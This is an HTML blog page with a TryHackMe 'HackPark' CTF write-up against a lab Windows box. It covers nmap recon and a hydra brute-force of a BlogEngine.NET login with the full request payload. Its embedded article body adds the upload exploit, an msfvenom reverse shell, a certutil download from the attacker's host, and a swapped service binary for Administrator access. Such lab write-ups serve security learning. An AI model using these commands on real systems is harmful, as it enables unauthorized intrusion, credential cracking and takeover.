@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TryHackMe - HackPark | All Things Cyber – joonkim0625</title>
+<meta name="keywords" content="ctf, tryHackMe, cybersecurity, windows, rce, hydra, winpeas">
+<meta name="description" content="Challenge: HackPark
+In this box, it introduces Hydra, RCE &amp; WinPEAS tools/techniques to exploit a
+Windows System.
+Recon
+NMAP
+nmap -sC -sV -O -sT 10.10.170.188
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC
+Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188)
+Host is up (0.00068s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+| http-methods:
+|_  Potentially risky methods: TRACE
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2023-06-20T18:28:29&#43;00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2023-06-19T18:14:25
+|_Not valid after:  2023-12-19T18:14:25
+| rdp-ntlm-info:
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2023-06-20T18:28:24&#43;00:00
+MAC Address: 02:51:BA:0B:1C:1B (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds
+Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once
+we get the cred to get onto the target machine we can remotely access it by
+using xfreerdp or rdesktop.">
+<meta name="author" content="Joon Kim">
+<link rel="canonical" href="https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css" integrity="sha256-j&#43;ECM6cGvIfy4Is8&#43;XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://joonkim0625.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://joonkim0625.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://joonkim0625.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://joonkim0625.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://joonkim0625.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:url" content="https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/">
+  <meta property="og:site_name" content="All Things Cyber – joonkim0625">
+  <meta property="og:title" content="TryHackMe - HackPark">
+  <meta property="og:description" content="Challenge: HackPark In this box, it introduces Hydra, RCE &amp; WinPEAS tools/techniques to exploit a Windows System.
+Recon NMAP nmap -sC -sV -O -sT 10.10.170.188 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188) Host is up (0.00068s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-06-20T18:28:29&#43;00:00; 0s from scanner time. | ssl-cert: Subject: commonName=hackpark | Not valid before: 2023-06-19T18:14:25 |_Not valid after: 2023-12-19T18:14:25 | rdp-ntlm-info: | Target_Name: HACKPARK | NetBIOS_Domain_Name: HACKPARK | NetBIOS_Computer_Name: HACKPARK | DNS_Domain_Name: hackpark | DNS_Computer_Name: hackpark | Product_Version: 6.3.9600 |_ System_Time: 2023-06-20T18:28:24&#43;00:00 MAC Address: 02:51:BA:0B:1C:1B (Unknown) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (89%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once we get the cred to get onto the target machine we can remotely access it by using xfreerdp or rdesktop.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-06-28T22:00:00+00:00">
+    <meta property="article:modified_time" content="2023-06-28T22:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="TryHackMe">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="RCE">
+    <meta property="article:tag" content="Hydra">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TryHackMe - HackPark">
+<meta name="twitter:description" content="Challenge: HackPark
+In this box, it introduces Hydra, RCE &amp; WinPEAS tools/techniques to exploit a
+Windows System.
+Recon
+NMAP
+nmap -sC -sV -O -sT 10.10.170.188
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC
+Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188)
+Host is up (0.00068s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+| http-methods:
+|_  Potentially risky methods: TRACE
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2023-06-20T18:28:29&#43;00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2023-06-19T18:14:25
+|_Not valid after:  2023-12-19T18:14:25
+| rdp-ntlm-info:
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2023-06-20T18:28:24&#43;00:00
+MAC Address: 02:51:BA:0B:1C:1B (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds
+Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once
+we get the cred to get onto the target machine we can remotely access it by
+using xfreerdp or rdesktop.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://joonkim0625.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "TryHackMe - HackPark",
+      "item": "https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TryHackMe - HackPark",
+  "name": "TryHackMe - HackPark",
+  "description": "Challenge: HackPark In this box, it introduces Hydra, RCE \u0026amp; WinPEAS tools/techniques to exploit a Windows System.\nRecon NMAP nmap -sC -sV -O -sT 10.10.170.188 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188) Host is up (0.00068s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=hackpark | Not valid before: 2023-06-19T18:14:25 |_Not valid after: 2023-12-19T18:14:25 | rdp-ntlm-info: | Target_Name: HACKPARK | NetBIOS_Domain_Name: HACKPARK | NetBIOS_Computer_Name: HACKPARK | DNS_Domain_Name: hackpark | DNS_Computer_Name: hackpark | Product_Version: 6.3.9600 |_ System_Time: 2023-06-20T18:28:24+00:00 MAC Address: 02:51:BA:0B:1C:1B (Unknown) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (89%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once we get the cred to get onto the target machine we can remotely access it by using xfreerdp or rdesktop.\n",
+  "keywords": [
+    "ctf", "tryHackMe", "cybersecurity", "windows", "rce", "hydra", "winpeas"
+  ],
+  "articleBody": "Challenge: HackPark In this box, it introduces Hydra, RCE \u0026 WinPEAS tools/techniques to exploit a Windows System.\nRecon NMAP nmap -sC -sV -O -sT 10.10.170.188 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188) Host is up (0.00068s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements | http-methods: |_ Potentially risky methods: TRACE 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=hackpark | Not valid before: 2023-06-19T18:14:25 |_Not valid after: 2023-12-19T18:14:25 | rdp-ntlm-info: | Target_Name: HACKPARK | NetBIOS_Domain_Name: HACKPARK | NetBIOS_Computer_Name: HACKPARK | DNS_Domain_Name: hackpark | DNS_Computer_Name: hackpark | Product_Version: 6.3.9600 |_ System_Time: 2023-06-20T18:28:24+00:00 MAC Address: 02:51:BA:0B:1C:1B (Unknown) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2012 (89%) OS CPE: cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 1 hop Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once we get the cred to get onto the target machine we can remotely access it by using xfreerdp or rdesktop.\nAttacking the login page The official write-up takes me to the login page of the website. After finding a login page, we need to identify what type of requests the form makes to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.\nWe can check which request is made when a form is submitted by inspecting HTML elements. Once we know the URL for the login form and the type of request being made, we can start the brute-force attack on an account.\nWhen I clicked on the login page link, the URL changed to http://10.10.170.188/Account/login.aspx?ReturnURL=/admin/. Because of this, I would try the brute-force attack on the admin account first. To do this, we can use hydra which is a login cracker.\nhydra -l -P http-post-form\nSo first, I tried hydra -l admin -P 10.10.170.188 http-post-form, but it was not working. I had to look up what I was doing wrong, then I found out from this article that, in order to to an attack on a login form, we need to know the following parameters: Hostname/IP, Login Page URL, Request Body, and Error Message.\nhydra -L -P http-post-form “::”\nThis is the “::” part I crafted. Make sure that contents are separated using :.\n\"/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO\u0026__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx\u0026ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\" The ‘VIEWSTATE’ part is from the request payload you can see from the inspector of your web-browser.\nThe command I used:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.170.188 http-post-form \"/Account/login.aspx:__VIEWSTATE=vTEGEhWaMSkYpJxnYRcsEwldVEjlvYM6WqpOAx1NfYQPxNyQ4zXFXr%2Fza5tvCHi1SM306YGu4Uc7qGyMC9pJ%2B%2FRQEBzzBUsho4whVX4CbhZzzY%2Fsb8Ww76WQu8cHpvppQ7gBCSiYWGMzwJDnJ8BWIXo73peBkzDqZdIWRI1bc6bUJWzziTgItFwPLC3IarpP8JgqnRk5UrUPNDfiG8ZxiGiGCUxWVUUJ7CdG6EwYNPYDIAcMWcUjFWb2A7iG8ru%2F0BtNKQOVMbv%2BUouXMj3MHFTYC%2FWQv21ZPQF0JNqP7B8YAixf1YPbVX0IQGSfJKujS5ujkr2iZo8GCRslsnbQlHetNZKvVSwqNDZTT0CUcmnKNr%2BO\u0026__EVENTVALIDATION=luSIModQouaXwBUZ3ewZVbYRemGqC%2Bqshym%2FHORkGPw9mj66TR3pzV8n9i3EYgjEY8DiHt%2By0Bubsj5nBrvl5LcfglN2%2Fdh%2FtCUjyzUquslWipgaKmftx3r9ErXuD%2FK2t0vBkGh1UiG16TGFyA9TLlC%2BPLnew%2F0vW39dssS%2FveOZ7fEx\u0026ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\" I was able to get admin:1qaz2wsx\nCompromise the machine Since we have a credential to use, we will use exploit-db.com to get initial access on the target machine. #Exploit-db is a #CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches (owned by Offensive Security).\nSo, if we login using the admin credential, we can see that the service is blogengine.net with version 3.3.6.0. Let’s search for some exploits using searchsploit.\nThis exploit is simple enough to follow. The instruction tells me how to upload a file to the existing post - download the .cs file provided and modify it so it includes our machine (or the attacker’s machine IP address and the port) and rename it to PostView.ascx. Then finally go to the address http:///?theme=../../App_Data/files. If everything is done properly, your nc listener should have the connection.\nWindows Privilege Escalation Although we have a shell, the shell behaves abnormally. So, we would need to upload a shell generated by msfvenom then use that shell to have a stable connection.\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.223 LPORT=2345 -f exe -o rev.exe will get us the reverse shell. And we will move this onto the victim machine by running certutil.exe -urlcache -split -f \"http://10.13.14.223:8000/rev.exe\" %tmp%\\rev.exe. This will put the file onto C:\\Windows\\Temp directory.\nRunning rev.exe will give us a better shell on nc listener 2345.\nThe next question asks what is the name of the abnormal service running. In order to find out about this, moving WinPEAS onto the target machine then have it enumerate the machine.\nAfter running WinPEAS, I looked through the services running on the system and this one system caught my eye:\nWindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\\PROGRA~2\\SYSTEM~1\\WService.exe] - Auto - Running File Permissions: Everyone [WriteData/CreateFiles] Possible DLL Hijacking in binary folder: C:\\Program Files (x86)\\SystemScheduler (Everyone [WriteData/CreateFiles]) WindowsScheduler file permission is Everyone and it says Possible DLL Hijacking in binary folder.\nLet’s move into the directory then. In the binary folder, you can see a few .dll files. However, the module’s question asks what the name of the binary we are supposed to exploit. So I would assume that would be scheduler.exe or wscheduler.exe, but they were not. The hint suggest to look at the log of this abnormal service. I moved into Events directory and I found out this file .INI_LOG.txt.\nThe parts of the log shows:\n06/20/23 20:30:33,Process Ended. PID:1848,ExitCode:4,Message.exe (Administrator) 06/20/23 20:31:01,Event Started Ok, (Administrator) 06/20/23 20:31:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator) 06/20/23 20:32:01,Event Started Ok, (Administrator) 06/20/23 20:32:33,Process Ended. PID:2376,ExitCode:4,Message.exe (Administrator) 06/20/23 20:33:01,Event Started Ok, (Administrator) 06/20/23 20:33:33,Process Ended. PID:1636,ExitCode:4,Message.exe (Administrator) It runs Message.exe! This suggests that if we can overwrite this file with our own executable (with the same name), we can run that executable as the Administrator privilege.\nI crafted a new reverse shell with a different port number and moved that shell into the directory (also changed the name of the shell to Message.exe). A few moments later, I was able to see this:\n└─$ nc -lnvp 5678 listening on [any] 5678 ... connect to [10.13.14.223] from (UNKNOWN) [10.10.123.161] 49339 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\PROGRA~2\\SYSTEM~1\u003edir dir Volume in drive C has no label. Volume Serial Number is 0E97-C552 Directory of C:\\PROGRA~2\\SYSTEM~1 With this new connection with escalated privilege, I was able to get the user flag and the root flag.\nAnother interesting Windows box with using different tools to exploit a system.\n",
+  "wordCount" : "1132",
+  "inLanguage": "en",
+  "datePublished": "2023-06-28T22:00:00Z",
+  "dateModified": "2023-06-28T22:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Joon Kim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://joonkim0625.github.io/posts/2023-6-28-thm-hackpark/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "All Things Cyber – joonkim0625",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://joonkim0625.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://joonkim0625.github.io/" accesskey="h" title="All Things Cyber – joonkim0625 (Alt + H)">All Things Cyber – joonkim0625</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://joonkim0625.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://joonkim0625.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      TryHackMe - HackPark
+    </h1>
+    <div class="post-meta"><span title='2023-06-28 22:00:00 +0000 UTC'>June 28, 2023</span>&nbsp;·&nbsp;Joon Kim
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="challenge-hackpark">Challenge: HackPark<a hidden class="anchor" aria-hidden="true" href="#challenge-hackpark">#</a></h2>
+<p>In this box, it introduces Hydra, RCE &amp; WinPEAS tools/techniques to exploit a
+Windows System.</p>
+<h2 id="recon">Recon<a hidden class="anchor" aria-hidden="true" href="#recon">#</a></h2>
+<h3 id="nmap">NMAP<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h3>
+<pre tabindex="0"><code>nmap -sC -sV -O -sT 10.10.170.188
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 18:27 UTC
+Nmap scan report for ip-10-10-170-188.eu-west-1.compute.internal (10.10.170.188)
+Host is up (0.00068s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-robots.txt: 6 disallowed entries
+| /Account/*.* /search /search.aspx /error404.aspx
+|_/archive /archive.aspx
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: hackpark | hackpark amusements
+| http-methods:
+|_  Potentially risky methods: TRACE
+3389/tcp open  ssl/ms-wbt-server?
+|_ssl-date: 2023-06-20T18:28:29+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=hackpark
+| Not valid before: 2023-06-19T18:14:25
+|_Not valid after:  2023-12-19T18:14:25
+| rdp-ntlm-info:
+|   Target_Name: HACKPARK
+|   NetBIOS_Domain_Name: HACKPARK
+|   NetBIOS_Computer_Name: HACKPARK
+|   DNS_Domain_Name: hackpark
+|   DNS_Computer_Name: hackpark
+|   Product_Version: 6.3.9600
+|_  System_Time: 2023-06-20T18:28:24+00:00
+MAC Address: 02:51:BA:0B:1C:1B (Unknown)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2012 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2
+Aggressive OS guesses: Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 79.85 seconds
+</code></pre><p>Port 80 runs Microsoft HTTPAPI httpd 2.0. Also, port 3389 indicates that once
+we get the cred to get onto the target machine we can remotely access it by
+using <code>xfreerdp</code> or <code>rdesktop</code>.</p>
+<h2 id="attacking-the-login-page">Attacking the login page<a hidden class="anchor" aria-hidden="true" href="#attacking-the-login-page">#</a></h2>
+<p>The official write-up takes me to the login page of the website. After finding a login
+page, we need to identify what type of requests the form makes to the webserver.
+Typically, web servers make two types of requests, a <code>GET</code> request which is used
+to request data from a webserver and a <code>POST</code> request which is used to send data
+to a server.</p>
+<p>We can check which request is made when a form is submitted by inspecting HTML
+elements. Once we know the URL for the login form and the type of request being
+made, we can start the brute-force attack on an account.</p>
+<p>When I clicked on the login page link, the URL changed to
+<code>http://10.10.170.188/Account/login.aspx?ReturnURL=/admin/</code>. Because of this, I
+would try the brute-force attack on the admin account first. To do this, we can
+use <code>hydra</code> which is a login cracker.</p>
+<p><code>hydra -l &lt;username&gt; -P &lt;path_to_wordlist&gt; &lt;ip&gt; http-post-form</code></p>
+<p>So first, I tried <code>hydra -l admin -P &lt;path_to_wordlist&gt; 10.10.170.188 http-post-form</code>, but it was not working. I had to look up what I was doing
+wrong, then I found out from <a href="https://it-tfuerst.de/2021/02/06/hackpark-write-up-medium-level/">this
+article</a> that,
+in order to to an attack on a login form, we need to know the following
+parameters: Hostname/IP, Login Page URL, Request Body, and Error Message.</p>
+<p><code>hydra -L &lt;USER&gt; -P &lt;Password&gt; &lt;ip&gt; http-post-form “&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;”</code></p>
+<p>This is the <code>“&lt;Login Page&gt;:&lt;Request Body&gt;:&lt;Error Message&gt;”</code> part I crafted. Make
+sure that contents are separated using <code>:</code>.</p>
